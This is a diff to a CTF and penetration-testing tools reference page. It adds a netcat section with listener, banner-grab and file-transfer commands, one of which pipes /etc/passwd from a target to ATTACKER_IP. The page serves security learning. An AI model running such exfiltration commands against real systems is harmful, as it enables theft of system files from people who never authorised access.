@@ -1,7 +1,7 @@
 ---
 title: "CTF Tools Reference — Essential Hacking Tools Guide"
 sidebarTitle: "Tools"
-description: "Reference guide for essential CTF and penetration testing tools including nmap, gobuster, linpeas, netcat, and more."
+description: "A reference for essential CTF tools — nmap, gobuster, nikto, netcat, Metasploit, linpeas, John the Ripper, Hydra and more — with commands and usage notes."
 ---
 
 Every writeup on this site relies on a core set of tools. Rather than explaining each one from scratch in individual room writeups, this page serves as a standing reference — what each tool does, when to reach for it, and the exact command patterns used throughout. Whether you are setting up your environment for the first time or brushing up on a specific utility, this is where to start.
@@ -128,6 +128,32 @@ Every writeup on this site relies on a core set of tools. Rather than explaining
 
   <Accordion title="💥 Exploitation" icon="bolt">
     Frameworks and tools for turning discovered vulnerabilities into working shells and access.
+
+    ---
+
+    ### netcat
+
+    The "Swiss army knife" of networking — `netcat` (`nc`) opens raw TCP/UDP connections, making it essential for catching reverse shells, transferring files, and manually probing services.
+
+    ```bash
+    # Listen for an incoming reverse shell
+    nc -lvnp 4444
+
+    # Connect to an open port to banner-grab or probe a service
+    nc <TARGET_IP> 80
+
+    # Transfer a file from target to attacker (run listener first)
+    # On attacker machine:
+    nc -lvnp 9001 > loot.txt
+    # On target machine:
+    nc <ATTACKER_IP> 9001 < /etc/passwd
+    ```
+
+    Key flags:
+    - `-l` — listen mode
+    - `-v` — verbose output
+    - `-n` — skip DNS resolution (faster)
+    - `-p` — specify port
 
     ---
 
